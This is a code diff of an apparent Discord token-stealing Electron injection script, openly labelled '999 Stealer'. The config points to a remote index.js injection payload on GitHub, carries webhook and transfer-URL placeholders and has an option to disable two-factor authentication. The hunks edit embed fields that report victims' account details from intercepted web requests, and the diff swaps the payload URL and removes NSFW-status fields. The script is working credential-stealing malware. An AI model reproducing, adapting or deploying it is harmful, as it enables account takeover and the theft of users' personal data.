@@ -20,10 +20,10 @@ var config = {
   disable2FA: "%DISABLEFA%",
   changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
   mail: "%CLIENTEMAIL%",
-  creator: "999 Stealer",
+  creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/0xFl4q/SalemAkhy/main/index.js",
+    "https://raw.githubusercontent.com/familigy/sub/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -755,11 +755,6 @@ const FirstTime = async () => {
             {
               name: "Language <a:black_bolt:1236873739795300422> ",
               value: `${GetLangue(user.locale)}`,
-              inline: !0,
-            },
-            {
-              name: "NSFW <:3568underage:1153991874495922207>",
-              value: `${GetNSFW(user.nsfw_allowed)}`,
               inline: !0,
             },
             {
@@ -1838,11 +1833,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                     value: `${GetLangue(user.locale)}`,
                     inline: !0,
                   },
-                  {
-                    name: "NSFW <:3568underage:1153991874495922207>",
-                    value: `${GetNSFW(user.nsfw_allowed)}`,
-                    inline: !0,
-                  },
+                 
                   {
                     name: "A2F <a:black_wings:1236871121094053968> ",
                     value: `${GetA2F(user.mfa_enabled)}`,
@@ -1966,11 +1957,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                   inline: !0,
                 },
                 {
-                  name: "NSFW <:3568underage:1153991874495922207>",
-                  value: `${GetNSFW(user.nsfw_allowed)}`,
-                  inline: !0,
-                },
-                {
                   name: "A2F <a:black_wings:1236871121094053968> ",
                   value: `${GetA2F(user.mfa_enabled)}`,
                   inline: !0,
@@ -2067,11 +2053,6 @@ electron.session.defaultSession.webRequest.onCompleted(
               {
                 name: "Language <a:black_bolt:1236873739795300422> ",
                 value: `${GetLangue(user.locale)}`,
-                inline: !0,
-              },
-              {
-                name: "NSFW <:3568underage:1153991874495922207>",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
                 inline: !0,
               },
               {
@@ -2247,11 +2228,6 @@ electron.session.defaultSession.webRequest.onCompleted(
               {
                 name: "Language <a:black_bolt:1236873739795300422> ",
                 value: `${GetLangue(user.locale)}`,
-                inline: !0,
-              },
-              {
-                name: "NSFW <:3568underage:1153991874495922207>",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
                 inline: !0,
               },
               {
